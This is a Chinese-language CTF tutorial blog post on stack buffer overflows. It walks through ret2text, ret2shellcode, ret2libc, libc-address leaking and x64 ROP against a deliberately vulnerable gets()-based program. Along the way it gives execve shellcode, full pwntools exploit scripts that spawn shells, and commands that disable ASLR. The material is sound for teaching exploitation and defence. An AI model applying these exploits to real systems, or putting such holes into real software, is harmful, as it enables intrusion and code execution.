---
title: CTF Pwn：栈溢出从入门到 ret2libc
date: 2026-09-12 18:00:00
categories: [CTF, Pwn]
tags: [CTF, Pwn, 栈溢出, ret2libc, 二进制安全]
cover: /img/bg12.jpg
---

## 栈溢出是什么

栈溢出（Stack Buffer Overflow）是二进制安全中最经典、最基础的漏洞类型。当程序向栈上的缓冲区写入超过其分配大小的数据时，多余的数据会覆盖栈上的其他内容——包括保存的基址指针（EBP/RBP）和返回地址（Return Address）。通过精心构造溢出数据，攻击者可以控制返回地址，让程序跳转到任意代码执行。

栈溢出的根因是 C/C++ 中缺乏边界检查的字符串操作函数：`gets()`、`strcpy()`、`sprintf()`、`scanf("%s")` 等。

<!-- more -->

## 前置知识：栈的布局

以 32 位 x86 为例，函数调用时栈的布局从高地址到低地址：

```
高地址
+------------------+
|   参数 N         |  ← 调用者压入的参数
|   参数 N-1       |
|   ...            |
|   返回地址       |  ← call 指令压入，函数 ret 时弹出到 EIP
+------------------+
|   保存的 EBP     |  ← 旧的基址指针
+------------------+
|   局部变量 buf   |  ← 缓冲区（低地址方向增长）
|   局部变量 x     |
低地址
```

关键理解：
- 栈从高地址向低地址增长
- 缓冲区写入方向是从低地址向高地址（与栈增长方向相反）
- 所以溢出数据会先覆盖局部变量，然后是保存的 EBP，最后是返回地址

## 环境准备

### 关闭 ASLR

```bash
# 临时关闭（重启后恢复）
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# 永久关闭
echo 'kernel.randomize_va_space = 0' | sudo tee /etc/sysctl.d/01-aslr.conf
sudo sysctl -p
```

ASLR（地址空间布局随机化）会让栈、库、堆的地址每次运行都不同，增加利用难度。学习阶段先关掉。

### 编译选项

```bash
# 最基础的漏洞程序编译（关闭所有保护）
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vuln vuln.c

# 各选项含义：
# -m32              编译为 32 位
# -fno-stack-protector  关闭栈保护（canary）
# -z execstack      栈可执行
# -no-pie           关闭位置无关执行（程序基址固定）
# -z norelro        关闭 RELRO（GOT 表可写）
```

### 常用工具

- **pwntools**：Python 漏洞利用框架，必备
- **gdb + pwndbg/gef**：动态调试
- **checksec**：检查二进制保护机制
- **ROPgadget / ropper**：查找 ROP  gadget
- **one_gadget**：查找 libc 中的 one_gadget

```bash
pip install pwntools
# pwndbg 安装
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh
```

## 第一关：ret2text（跳转到已有函数）

最基础的利用：程序里已经有一个调用 `system("/bin/sh")` 的函数，我们只需要覆盖返回地址跳过去。

### 漏洞程序

```c
#include <stdio.h>
#include <stdlib.h>

void backdoor() {
    system("/bin/sh");
}

int main() {
    char buf[32];
    printf("输入: ");
    gets(buf);  // 漏洞点：无边界检查
    return 0;
}
```

### 计算偏移

```bash
# 用 pattern 创建唯一字符串
gdb-pwndbg> pattern create 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

# 输入后程序崩溃，查看崩溃时的 EIP
gdb-pwndbg> r < <(echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa')
gdb-pwndbg> pattern offset $eip
# 输出：Found at offset 44
```

偏移 = 32（缓冲区）+ 4（保存的 EBP）= 36？不对，实际是 44，因为编译器可能有对齐填充。以 pattern 计算为准。

### 利用脚本

```python
from pwn import *

context(arch='i386', os='linux')
p = process('./vuln')

# backdoor 函数地址（用 objdump 或 gdb 查看）
backdoor_addr = 0x08049182

payload = b'A' * 44          # 填充到返回地址
payload += p32(backdoor_addr) # 覆盖返回地址

p.sendline(payload)
p.interactive()
```

## 第二关：ret2shellcode（执行自己写的 shellcode）

当程序中没有可直接利用的函数时，可以在缓冲区里放入自己写的 shellcode，然后让返回地址跳转到缓冲区。

前提：栈可执行（`-z execstack`）、ASLR 关闭或能泄露栈地址。

### shellcode 编写

32 位 execve("/bin/sh") 的 shellcode（28 字节）：

```asm
xor eax, eax        ; eax = 0
push eax            ; 字符串结束符 \0
push 0x68732f2f     ; "//sh"
push 0x6e69622f     ; "/bin"
mov ebx, esp        ; ebx = "/bin//sh" 的地址
push eax            ; envp = NULL
push ebx            ; argv = ["/bin//sh", NULL]
mov ecx, esp        ; ecx = argv
mov al, 0xb         ; execve 系统调用号
int 0x80            ; 触发系统调用
```

用 pwntools 生成：

```python
shellcode = asm(shellcraft.sh())
# 或直接用内置的
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```

### 利用脚本

```python
from pwn import *

context(arch='i386', os='linux')
p = process('./vuln')

# 泄露栈地址（程序可能有 printf 泄露）
# 或者 ASLR 关闭时栈地址固定
buf_addr = 0xffffd0c0  # 用 gdb 查看 buf 的地址

shellcode = asm(shellcraft.sh())

payload = shellcode                      # 开头放 shellcode
payload += b'A' * (44 - len(shellcode)) # 填充到返回地址
payload += p32(buf_addr)                 # 跳转到 shellcode

p.sendline(payload)
p.interactive()
```

## 第三关：ret2libc（调用 libc 中的函数）

当栈不可执行（NX 保护开启）时，shellcode 无法执行。这时可以利用程序中已加载的 libc 库，调用其中的 `system()` 函数。

### 原理

libc 中一定有 `system()` 函数和 `/bin/sh` 字符串。我们需要：
1. 让返回地址跳转到 `system()` 的 PLT 或 GOT 地址
2. 在栈上布置 `system()` 的参数：`"/bin/sh"` 的地址

32 位下函数参数通过栈传递，ret2libc 的栈布局：

```
返回地址 → system@plt
返回地址后 4 字节 → system 的返回地址（随便填，比如 exit）
再后 4 字节 → system 的第一个参数："/bin/sh" 的地址
```

### 利用脚本

```python
from pwn import *

context(arch='i386', os='linux')
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# system 的 PLT 地址（程序中如果调用过 printf，PLT 里有）
system_plt = elf.plt['system']

# 在 libc 中找 /bin/sh 字符串
binsh_addr = next(libc.search(b'/bin/sh'))
# ASLR 关闭时 libc 基址固定，需要加上基址
libc_base = 0xf7dcb000  # 用 ldd 或 gdb 查看
binsh_addr += libc_base

payload = b'A' * 44
payload += p32(system_plt)    # 返回地址 → system
payload += p32(0xdeadbeef)     # system 的返回地址（执行完 system 后去哪，填 exit 更优雅）
payload += p32(binsh_addr)     # system 的参数 → "/bin/sh"

p.sendline(payload)
p.interactive()
```

### 更优雅：用 exit 作为返回地址

```python
exit_plt = elf.plt['exit']
payload += p32(exit_plt)  # system 执行完后调用 exit，避免崩溃
```

## 第四关：泄露 libc 基址（ASLR 开启时）

当 ASLR 开启时，libc 的加载地址每次都不同。需要先泄露一个 libc 函数的 GOT 地址，计算出 libc 基址，然后再进行 ret2libc。

### 原理

GOT（Global Offset Table）中存储的是函数在 libc 中的真实地址。通过 `puts(got_addr)` 可以把这个地址打印出来，然后减去该函数在 libc 中的偏移，得到 libc 基址。

### 利用脚本（两段式）

```python
from pwn import *

context(arch='i386', os='linux')
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# 第一阶段：泄露 puts 的 GOT 地址
payload1 = b'A' * 44
payload1 += p32(elf.plt['puts'])       # 调用 puts
payload1 += p32(elf.sym['main'])        # puts 返回后回到 main，进行第二次溢出
payload1 += p32(elf.got['puts'])        # puts 的参数：puts@got 的地址

p.sendline(payload1)
p.recvline()  # 跳过程序的正常输出
leaked = u32(p.recv(4))  # 读取泄露的地址
log.success(f'puts@libc = {hex(leaked)}')

# 计算 libc 基址
libc_base = leaked - libc.sym['puts']
log.success(f'libc_base = {hex(libc_base)}')

# 第二阶段：ret2libc
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'A' * 44
payload2 += p32(system_addr)
payload2 += p32(0xdeadbeef)
payload2 += p32(binsh_addr)

p.sendline(payload2)
p.interactive()
```

## 64 位下的差异

64 位 x86-64 下，函数的前 6 个参数通过寄存器传递（rdi, rsi, rdx, rcx, r8, r9），而不是栈。这意味着 ret2libc 需要用 ROP gadget 来设置寄存器。

### ret2libc in x64

需要一个 `pop rdi; ret` 的 gadget 来设置第一个参数：

```python
from pwn import *

context(arch='amd64', os='linux')
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 找 pop rdi; ret gadget
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# 泄露 libc（同 32 位思路，用 puts 泄露 got）
# ... 省略泄露阶段 ...

libc_base = leaked - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 64 位 payload 布局
payload = b'A' * 56  # 64 位偏移通常是 buf_size + 8（保存的 rbp）
payload += p64(pop_rdi)      # pop rdi → 下一个值进入 rdi
payload += p64(binsh_addr)   # rdi = "/bin/sh" 地址
payload += p64(system_addr)  # 调用 system

p.sendline(payload)
p.interactive()
```

## 保护机制与绕过

| 保护机制 | 作用 | 绕过方法 |
|----------|------|----------|
| NX/DEP | 栈不可执行 | ret2libc、ROP |
| ASLR | 地址随机化 | 泄露地址、信息泄露 |
| Stack Canary | 栈溢出检测 | 泄露 canary、格式化字符串 |
| PIE | 程序基址随机化 | 泄露程序地址、partial overwrite |
| RELRO | GOT 表只读 |  ret2dlresolve、largebin attack |

### Canary 绕过

Canary 是在返回地址前插入的一个随机值，函数返回前检查是否被篡改。绕过方法：
1. **泄露 canary**：通过格式化字符串或逐字节爆破
2. **绕过检查**：覆盖 `__stack_chk_fail` 的 GOT（需要 partial RELRO）
3. **不覆盖 canary**：利用其他漏洞（如格式化字符串直接写返回地址）

## 调试技巧

### pwndbg 常用命令

```bash
gdb-pwndbg> checksec          # 检查保护机制
gdb-pwndbg> vmmap             # 查看内存映射
gdb-pwndbg> rop --grep "pop rdi"  # 查找 gadget
gdb-pwndbg> search "/bin/sh"  # 搜索字符串
gdb-pwndbg> got               # 查看 GOT 表
gdb-pwndbg> telescope $esp 20 # 查看栈内容
gdb-pwndbg> context           # 显示完整上下文
```

### pwntools 调试

```python
from pwn import *

# gdb 调试
p = gdb.debug('./vuln', gdbscript='''
    break *0x080491a0
    continue
''')

# attach 到运行中的进程
p = process('./vuln')
gdb.attach(p, gdbscript='break *main')
```

## 常见坑

1. **偏移算错**：永远用 pattern 计算，不要手算
2. **sendline vs send**：`gets()` 会读到换行符，用 `sendline`；`read()` 按字节读，用 `send`
3. **接收数据不完整**：用 `p.recvuntil()` 精确接收，不要用 `p.recv()` 赌运气
4. **libc 版本不对**：本地利用成功但远程失败，通常是 libc 版本不同，需要用远程的 libc
5. **栈对齐**：64 位下调用 system 前需要 `ret` gadget 做 16 字节栈对齐，否则会段错误

## 总结

栈溢出是 Pwn 的入门基石，从 ret2text → ret2shellcode → ret2libc → 泄露 libc，每一步都是在更严格的保护下寻找利用路径。掌握了栈溢出，再去学堆溢出、格式化字符串、UAF 等更复杂的漏洞类型时，思路会清晰很多。

CTF Pwn 的核心能力是：读懂汇编、理解栈/堆布局、灵活运用 ROP 链、以及耐心调试。建议从 pwnable.kr、pwnable.tw 的基础题开始刷，逐步积累手感。
